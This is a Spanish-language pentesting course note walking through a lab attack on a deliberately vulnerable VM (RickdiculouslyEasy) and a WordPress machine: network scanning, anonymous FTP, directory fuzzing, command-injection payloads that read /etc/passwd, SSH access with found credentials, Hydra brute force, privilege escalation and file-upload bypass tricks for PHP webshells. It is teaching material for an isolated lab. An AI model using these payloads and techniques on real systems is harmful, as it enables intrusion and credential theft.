

> [!info] Relacionado con
> [[Vulnerabilidades Web - OWASP Top 10 y Burp Suite]] · [[Enumeración Web]] · [[Fuzzing Web con ffuf]] · [[Explotación de Servicios - Linux]] · [[Reverse Shells y Post-Explotación]]
>

---

## ① La máquina y el entorno

La máquina vulnerable se importa directamente desde un fichero `.ova` en VirtualBox. Atacante (Kali Linux) y víctima comparten la misma red NAT para tener visibilidad mutua.

| Rol | Sistema |
|-----|---------|
| **Atacante** | Kali Linux actualizada |
| **Víctima** | Metasploitable 2 / máquina vulnerable (IP ejemplo: 10.0.2.15) |

> [!tip] Formato de práctica
> Un alumno actúa como atacante tomando decisiones en tiempo real. El resto de la clase observa y participa. Esta metodología simula la dinámica real de una auditoría.

> [!warning] Regla de laboratorio
> La VM **nunca** se expone a internet: red aislada (NAT interno o host-only). Un Metasploitable en una red real es un regalo para cualquier atacante.

> [!tip] VMware vs VirtualBox
> En clase se recomienda **VMware**: VirtualBox suele dar problemas con el portapapeles bidireccional y el arrastre de archivos. Alternativa para transferir ficheros: carpeta compartida host↔VM.

---

## ② Fase 1 — Reconocimiento de red

El punto de partida: estamos en la misma red que la víctima y no sabemos nada más.

| Herramienta | Protocolo | Cuándo usarla |
|------------|-----------|---------------|
| **Net-Discover** | ARP (capa 2) | Reconocimiento inicial en red local. Más sigiloso, sin TCP. |
| **Nmap -sn** | TCP/ICMP (capas 3-4) | Más ruido. Cuando Net-Discover no es suficiente o hay VLANs. |

```bash
# Descubrimiento ARP con Net-Discover:
sudo netdiscover -r 10.0.2.0/24

# Nmap también puede hacer host discovery (más ruidoso):
nmap -sn 10.0.2.0/24
```

> [!warning] AWS no acepta ARP
> En entornos cloud, Net-Discover no funciona. Se usa Nmap con `-sn` o se confía en el inventario del cliente.

---

## ③ Fase 2 — Escaneo de puertos y servicios

El escaneo se realiza en dos fases para equilibrar velocidad y cobertura:

```
Escaneo rápido (-sC -sV) → Analizar resultados → Escaneo completo (-p-) si hace falta
```

```bash
# Fase 1 — puertos comunes (rápido, primeros resultados):
nmap -sC -sV 10.0.2.15

# -sC lanza scripts por defecto (banner grabbing, configs débiles...)
# -sV detecta versiones de los servicios

# Resultado: puertos 21 (FTP), 22 (SSH), 80 (HTTP), 9090 (HTTP)

# Fase 2 — todos los puertos (si los comunes no dan vector):
nmap -sC -sV -p- 10.0.2.15

# Reveló puertos adicionales: 22222 (SSH real) y 60000 (reverse shell parcial)

# Variante agresiva (clase Metasploitable):
nmap -sCV 10.0.2.15 --min-rate=5000 -p-
# -sCV = -sC + -sV · --min-rate acelera sin perder cobertura
# Presionar V durante el escaneo para ver el porcentaje
```

> [!tip] Metodología ante servicios con login
> Tres vectores posibles: (1) fuerza bruta, (2) versión con CVE explotable, (3) mala configuración. Explorar en ese orden.

> [!warning] -sC vs -sCV y el puerto 22 "falso"
> Sin `-sV`/`-sCV`, Nmap muestra el servicio **esperado por defecto** en cada puerto. Con descubrimiento activo revela lo real: el 22 puede ser tcpwrapped (muerto) y el SSH auténtico estar en otro puerto (22222 en esta máquina).

---

## ④ Puerto 21 — FTP anónimo

Nmap indica `Anonymous FTP login allowed`. Mala configuración clásica: el servidor acepta conexiones bajo la cuenta de servicio FTP sin credenciales reales.

```bash
# Conectar con login anónimo automático:
ftp -a 10.0.2.15

# Una vez dentro (shell restringida del FTP):
help # ver comandos disponibles (no hay cat, locate...)
ls # listar ficheros
cd pub # cambiar al directorio pub
ls # → flag.txt
get flag.txt # descargar el fichero
exit # salir del FTP

# Leer desde la shell de Kali:
cat flag.txt
```

| Comando FTP | Función |
|-------------|---------|
| `ls / dir` | Listar ficheros y directorios del servidor |
| `cd <directorio>` | Cambiar directorio |
| `get <fichero>` | Descargar un fichero |
| `put <fichero>` | Subir un fichero (si hay permisos de escritura) |
| `mget *` | Descargar todos los ficheros del directorio actual |
| `help / ?` | Mostrar comandos disponibles en la shell FTP |

> [!info] La cuenta de servicio FTP no es un usuario del sistema
> Solo puede interactuar con el servicio FTP. Aplica a todos los servicios: Apache, PostgreSQL... cada uno tiene su cuenta de servicio con sus propios permisos.

> [!tip] Si se tiene acceso FTP con permisos de escritura a la carpeta de la web
> Subir un fichero PHP malicioso (webshell) es el siguiente paso hacia RCE.

---

## ⑤ Puerto 80 — Auditoría web: metodología completa

Un servicio HTTP se audita de forma diferente a un servicio de red. No se buscan versiones vulnerables: se enumera la funcionalidad y se buscan fallos en esa funcionalidad.

```
Ver código fuente → robots.txt → DirSearch (enumerar dirs) → Analizar funcionalidades → Explotar
```

### Paso 1 — Código fuente del front

Click derecho → Ver código fuente de la página. El código que se ve es solo el front (HTML, CSS, JavaScript). No es el código del servidor. Puede contener comentarios con rutas sensibles, referencias a APIs o endpoints desconocidos.

### Paso 2 — robots.txt

```bash
# Navegar directamente al fichero robots.txt:
http://10.0.2.15/robots.txt

# También probarlo en subdirectorios:
http://10.0.2.15/twiki/robots.txt

# Resultado en esta máquina:
# → Revela el directorio /passwords/
# → Dentro: flag.txt y passwords.html
```

> [!info] robots.txt
> Dice a los buscadores qué NO indexar. Para un pentester eso significa exactamente los directorios más interesantes: los que el propietario quiere que nadie vea. Siempre es el segundo paso en cualquier auditoría web.

### Paso 3 — Enumeración de directorios

```bash
# DirSearch (diccionario propio por defecto):
dirsearch -u http://10.0.2.15

# ffuf con diccionario medio (más cobertura):
ffuf -u http://10.0.2.15/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Feroxbuster:
feroxbuster -u http://10.0.2.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

| Herramienta | Característica principal |
|------------|------------------------|
| **DirSearch** | Diccionario propio incluido. Buena opción por defecto. `-r` activa recursividad. |
| **ffuf** | Muy rápido, muy flexible. Soporta fuzzing de subdominios (FUZZ al inicio de la URL). |
| **Feroxbuster** | Recursivo por defecto. Encuentra directorios anidados. |
| **GoBuster** | Rápido, múltiples modos (dir, dns, vhost). |
| **DirBuster** | Versión gráfica (Java). Más lenta. |
| **Metasploit dir_scanner** | `use auxiliary/scanner/http/dir_scanner` — rápido pero menos completo que ffuf con diccionario grande. |

> [!tip] Todas las herramientas de fuzzing hacen lo mismo
> La diferencia es el diccionario por defecto y la velocidad. Con el mismo diccionario los resultados son idénticos.

### Diccionarios recomendados

| Diccionario | Uso principal |
|-------------|--------------|
| `directory-list-2.3-medium.txt` | Fuzzing web (ya en Kali) |
| `common.txt` (dirb) | Fuzzing rápido |
| **SecLists** (`raft-medium-directories`, `common-php`...) | Todo: dirs, usuarios, contraseñas, SQLi, LFI |
| **PayloadsAllTheThings** | Payloads web: XSS, SQLi, LFI |

```bash
# Recursividad en dirsearch (clave en Academy: sin -r no ves /wordpress/*)
dirsearch -u http://IP/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# ffuf con colores
ffuf -u http://IP/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> [!important] REGLA DE ORO — robots.txt siempre
> **Siempre** buscar `robots.txt` (y en subdirectorios). Contiene los directorios que el propietario **no quiere que Google indexe** — para el pentester son los más interesantes.

### Códigos HTTP de respuesta

| Código | Significado |
|--------|------------|
| 200 | OK — recurso existe y se sirve |
| 301 / 302 | Redirección (frecuente: dominio real ≠ IP → `/etc/hosts`) |
| 403 | Existe pero prohibido |
| 404 | No encontrado |

Truco mnemotécnico: https://http.cat

### Paso 4 — Analizar funcionalidades (Burp Suite)

Un proxy como **Burp Suite** se interpone entre navegador y servidor: `Navegador → [Burp] → Servidor`. Con FoxyProxy (`127.0.0.1:8080`) se activa con un clic.

- **Intercept ON**: cada petición queda retenida hasta Forward
- **HTTP History**: con Intercept OFF sigue registrando todo → auditar sin interrumpir
- **Repeater**: reenviar la misma petición modificada
- **Intruder**: ataque masivo con diccionario sobre un parámetro

> [!tip] Enumeración de usuarios por longitud de respuesta
> En Intruder se marca el campo usuario; un "invalid username" mide ~4065 bytes y un "password incorrect" ~4116 → **longitud distinta = usuario válido**. Aplicado en Mr. Robot sobre `/wp-login.php`.

> [!warning] Information disclosure en logins
> Un login bien diseñado da un mensaje genérico ("usuario o contraseña incorrectos"). Si distingue "usuario inválido" de "contraseña incorrecta", revela qué usuarios existen. En WordPress es opción de configuración, no fallo de versión.

---

## ⑥ Command Injection — Explotación de funcionalidad web

En el directorio `cgi-bin` hay una página que implementa un traceroute: el usuario introduce una IP y el servidor ejecuta el comando y muestra el resultado. Si el desarrollador no valida el input, el atacante puede inyectar comandos adicionales.

```bash
# La aplicación ejecuta algo así internamente:
# traceroute <INPUT_USUARIO>

# Si no valida el input, el operador ; encadena comandos en bash:
# INPUT: 10.0.2.15; whoami
# → El servidor ejecuta: traceroute 10.0.2.15; whoami
# → Responde con el resultado del traceroute Y el resultado de whoami

# Confirmado el Command Injection, enumerar el sistema:
10.0.2.15; head -200 /etc/passwd # usuarios del sistema
10.0.2.15; tree /var/www/www # árbol de directorios de la web
10.0.2.15; id # permisos del proceso web
10.0.2.15; ls /home # usuarios con carpeta home
```

| Operador | Comportamiento en bash | Uso en Command Injection |
|----------|----------------------|------------------------|
| `;` | Ejecuta siempre ambos comandos | El más común. Funciona aunque el primer comando falle. |
| `&&` | Ejecuta el segundo solo si el primero tiene éxito | Útil cuando el primer comando debe completarse. |
| `\|` | Pipe: stdout del primero → stdin del segundo | Para filtrar o procesar la salida. |
| `\|\|` | Ejecuta el segundo solo si el primero falla | Útil para bypass de validaciones. |

### Confirmación y enumeración

```bash
# Confirmar RCE (ejemplos de clase):
10.0.2.15; whoami        # → www-data (cuenta de servicio de Apache)
8.8.8.8; whoami           # concatenación clásica de traceroute
10.0.2.15; id
10.0.2.15; head -200 /etc/passwd
10.0.2.15; tree /var/www/www
10.0.2.15; ls /home
```

> [!info] www-data
> Es la cuenta de servicio de Apache: si comprometes la web obtienes `www-data`, un usuario muy limitado. Siguiente paso: enumerar el sistema y escalar (usuario local → root).

> [!info] La solución al Command Injection
> Misma que para SQL Injection: validación estricta del input. Si esperas una IP, valida que el campo contenga exactamente 4 grupos numéricos separados por puntos y rechaza cualquier otro carácter.

---

## ⑦ Análisis de /etc/passwd — Identificar usuarios

```bash
# Formato de /etc/passwd:
# usuario:x:UID:GID:descripcion:/home/usuario:/bin/shell

# Usuarios con shell real (interesantes para atacar):
# root:x:0:0:root:/root:/bin/bash
# Summer:x:1001:1001::/home/Summer:/bin/bash

# Cuentas de servicio (sin shell, no sirven para login):
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# ftp:x:109:65534::/home/ftp:/usr/sbin/nologin

# Filtrar solo los usuarios con bash:
grep '/bin/bash' /etc/passwd # o desde Command Injection:
10.0.2.15; grep '/bin/bash' /etc/passwd
```

> [!tip] Con Command Injection confirmado y /etc/passwd leído
> Se obtienen los usuarios reales del sistema (los que tienen `/bin/bash`). Esto reduce la fuerza bruta de infinito a 4 usuarios concretos.

---

## ⑧ Puerto 9090 — Rabbit Hole (Cockpit)

El puerto 9090 aloja **Cockpit**, un panel de administración web para servidores Linux. Cockpit v161 con Fedora 26 tiene CVEs asociados, pero ninguno explotable sin autenticación previa.

> [!warning] Rabbit hole
> Un rabbit hole es un camino que parece prometedor pero no conduce a ningún vector de explotación. Saber cuándo cortar y no seguir invirtiendo tiempo en algo sin salida es una habilidad tan importante como saber explotar.

> [!tip] Señales de rabbit hole
> CVEs que requieren autenticación previa que no tenemos, funcionalidades que no aceptan ningún input manipulable, o enumeración de directorios que devuelve 403 en todo. → Documentar y pasar al siguiente servicio.

---

## ⑨ Puerto 22222 — SSH real (no el 22)

El SSH real no está en el puerto 22, sino en el **22222**. Con las credenciales extraídas de `passwords.html` (obtenida por robots.txt):

```bash
# Conectarse al SSH no estándar (puerto 22222):
ssh Summer@10.0.2.15 -p 22222
# Contraseña: winter

# Verificar acceso:
whoami # → Summer
id # → uid, grupos
pwd # → /home/Summer
```

> [!warning] ¿Por qué Nmap "mentía" en el puerto 22?
> Sin parámetros, Nmap muestra el servicio **esperado por defecto** en cada puerto. Con `-sCV` hace descubrimiento activo y muestra lo que **realmente** hay: el 22 era un servicio falso (tcpwrapped) y el SSH auténtico estaba en el 22222 (OpenSSH).

---

## ⑩ Puerto 60000 — Reverse shell parcial

```bash
# Probar el puerto 60000 con NetCat:
nc 10.0.2.15 60000
# Respuesta: 'Welcome to Rick's half-baked reverse shell'

# Shell funcional pero restringida al directorio actual
# → Leer la flag disponible y descartar como vector de escalada
```

> [!warning] Siempre escanear todos los puertos (-p-)
> El servicio SSH puede estar en un puerto no estándar (como 22222) para dificultar el descubrimiento. Nunca cerrar la enumeración sin `-p-`.

---

## ⑪ Post-explotación y movimiento lateral

Con acceso SSH (o reverse shell) empieza la enumeración interna:

```bash
cat /etc/passwd          # usuarios reales
sudo -l                  # qué puedo ejecutar como root sin contraseña
uname -a                 # kernel / SO
find / -perm -4000 2>/dev/null   # binarios SUID
```

> [!info] sudo -l vs SUID
> `sudo -l` lista comandos que mi usuario ejecuta como root (reglas predefinidas). El **bit SUID** son ficheros concretos que corren con permisos de su propietario.

### Transferencia de ficheros: cp y scp

```bash
# Copia interna (origen legible + destino escribible):
cp /home/user/fichero /tmp/

# Descargar de la víctima a Kali (¡ojo al puerto no estándar!):
scp -P 22222 summer@10.0.2.15:/home/Morty/Safe_Password.jpg .

# Subir a la víctima (invertir origen y destino):
scp -P 22222 payload.sh summer@10.0.2.15:/tmp/
```

### Análisis de ficheros robados

```bash
exiftool imagen.jpg    # metadatos
strings binario        # cadenas legibles (steganografía / credenciales ocultas)
unzip archivo.zip      # si pide contraseña → diccionario contextual
```

> [!tip] Generar diccionario a partir de pistas
> Si la contraseña sigue una política (mayúscula + dígito + palabra clave), generar solo esas combinaciones y pasarla a Hydra: `hydra -l user -P diccionario.txt ssh://IP:22222`. Sanitizar diccionarios ajenos: `sort dic | uniq > dic_clean`.

---

## ⑫ Cadenas completas de explotación

### RickdiculouslyEasy (práctica de clase)

```
netdiscover → nmap -p- → FTP anon (flag)
  → robots.txt + código fuente → /passwords/ → winter
  → Command Injection cgi-bin → /etc/passwd → usuarios
  → SSH:22222 como summer → robo de ficheros (scp)
  → strings/zip → pista de política → diccionario → Hydra → RickSanchez
  → sudo -l → (ALL:ALL) ALL → sudo su → root
```

| Puerto | Servicio | Vector | Hallazgo |
|--------|---------|--------|---------|
| **21** | FTP | Login anónimo (anonymous) | flag.txt en /pub/ |
| **80** | HTTP | robots.txt → directorio /passwords/ | flag.txt + passwords.html (credenciales) |
| **80 / cgi-bin** | HTTP | Command Injection (;whoami) | Usuarios del sistema desde /etc/passwd |
| **9090** | Cockpit | Rabbit hole — sin vector sin auth | Descartado |
| **22222** | SSH | Credenciales: Summer / winter | Shell en el servidor |
| **60000** | TCP | Reverse shell parcial (nc) | flag.txt (shell restringida) |

### Academy (WordPress — ver [[WordPress - Auditoría con WPScan]])

```
netdiscover → nmap (22, 80) → dirsearch -r → /wordpress (301)
  → /etc/hosts → WPScan → 6.5.3 + usuarios + Elementor
  → brute force rockyou → Dylan / password1 → /wp-admin
  → editor de temas 404.php → reverse shell PHP → www-data
  → estabilizar TTY → (privesc pendiente)
```

> [!tip] El acceso completo se consiguió sin ningún exploit sofisticado
> Enumeración metódica (Nmap), curiosidad ante cada funcionalidad (robots.txt, código fuente) y correlacionar información de varias fuentes (usuarios de /etc/passwd + contraseña de la web).

> [!info] File Upload como alternativa a editor de temas
> Si la web permite subir ficheros, una reverse shell PHP (o msfvenom `php/meterpreter/reverse_tcp`) en la ruta de uploads (`/var/www/.../images/tmp/shell.php`) da el mismo resultado que el editor de Temas. Bypasses típicos: extensión doble (`shell.php.jpg`), `.phtml`/`.php5`, null byte (`shell.php%00.jpg`), `.htaccess` (`AddType application/x-httpd-php .jpg`).

---

## ⑬ Resumen: vectores y hallazgos

| Puerto | Servicio | Vector | Hallazgo |
|--------|---------|--------|---------|
| **21** | FTP | Login anónimo (anonymous) | flag.txt en /pub/ |
| **80** | HTTP | robots.txt → directorio /passwords/ | flag.txt + passwords.html (credenciales) |
| **80 / cgi-bin** | HTTP | Command Injection (;whoami) | Usuarios del sistema desde /etc/passwd |
| **9090** | Cockpit | Rabbit hole — sin vector sin auth | Descartado |
| **22222** | SSH | Credenciales: Summer / winter | Shell en el servidor |
| **60000** | TCP | Reverse shell parcial (nc) | flag.txt (shell restringida) |

> [!tip] El acceso completo se consiguió sin ningún exploit sofisticado
> Enumeración metódica (Nmap), curiosidad ante cada funcionalidad (robots.txt, código fuente) y combinar información de varias fuentes (usuarios de /etc/passwd + contraseña de la web).

---

## ⑭ Metodología integrada de auditoría web

| Fase | Acciones |
|------|---------|
| **1. Reconocimiento de red** | Net-Discover (ARP) → identificar hosts activos |
| **2. Enumeración de puertos** | nmap -sC -sV → luego -p- si hace falta |
| **3. Análisis por servicio** | FTP: anon / versión / CVE. HTTP: código fuente + robots.txt + dirsearch |
| **4. Explotación de funcionalidades** | Buscar inputs que lleguen al servidor (formularios, parámetros de URL) |
| **5. Información extraída** | Guardar TODO: usuarios, contraseñas, hashes, rutas, versiones |
| **6. Correlacionar hallazgos** | Credenciales de un servicio usadas en otro (pivoting de info) |
| **7. Descartar rabbit holes** | Sin autenticación no se puede explotar CVE que la requiere → siguiente |
| **8. Post-explotación** | Estabilizar shell → sudo -l / SUID → mover entre usuarios → root |

---

## Checklist de repaso

- [ ] ¿Sé hacer host discovery con Net-Discover y Nmap -sn?
- [ ] ¿Comprendo la diferencia entre -sC -sV y -p-?
- [ ] ¿Sé conectarme a FTP anónimo y navegar sus comandos?
- [ ] ¿Entiendo la metodología web: código fuente → robots.txt → dirsearch → explotar?
- [ ] ¿Uso fuzzing recursivo y conozco los diccionarios clave?
- [ ] ¿Sé interpretar los códigos HTTP y localizar robots.txt en subdirectorios?
- [ ] ¿Sé interceptar con Burp y enumerar usuarios por longitud de respuesta?
- [ ] ¿Sé identificar y explotar un Command Injection (; y &&)?
- [ ] ¿Leo /etc/passwd para distinguir cuentas de servicio vs usuarios reales?
- [ ] ¿Sé que el SSH puede estar en puertos no estándar y siempre escaneo -p-?
- [ ] ¿Identifico un rabbit hole y sé cuándo dejar de invertir tiempo?
- [ ] ¿Transfiero ficheros con scp -P y los analizo con strings/exiftool?
- [ ] ¿Genero diccionarios contextuales para Hydra?
- [ ] ¿Recorro sudo -l y find SUID tras obtener una shell?
- [ ] ¿Recuerdo siempre guardar TODO: usuarios, contraseñas, hashes, rutas?









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Chema/Auditoria web.md|Auditoria web]] — GoBuster, Kali Linux, Seguridad
- [[../../apuntes Chema/Maquinas/Auditoría de CMS - WordPress (máquina Academy).md|Auditoría de CMS - WordPress (máquina Academy)]] — GoBuster, Kali Linux, Seguridad
- [[../../write-ups/Academy-THL.md|Academy-THL]] — File Upload, GoBuster, Kali Linux
- [[../../apuntes Joselu/MODULO3/resumen_master_clase45.md|resumen_master_clase45]] — GoBuster, Kali Linux, Seguridad
- [[../../apuntes Joselu/MODULO3/resumen_master_clase39.md|resumen_master_clase39]] — File Upload, GoBuster, Kali Linux

### 🌐 Cross-Dominio

- [[../../../programacion/Node/seguridad_node.md|seguridad_node]] — Programacion: Desarrollo Web, Funcional, Seguridad
- [[../../../programacion/Java/seguridad_java.md|seguridad_java]] — Programacion: Desarrollo Web, Linux, Seguridad

> #burpsuite #cli #cloud_base #command_injection #dirsearch #feroxbuster #ffuf #file_upload #funcional #gobuster #hydra #java #javascript #kali #linux #linux_ciber #metasploit #netcat #nmap #pentest #pivoting #post_explotacion #redes #redes_ciber #reverse_shell #seguridad #sql #sqli #ssh_tool #web #wordpress
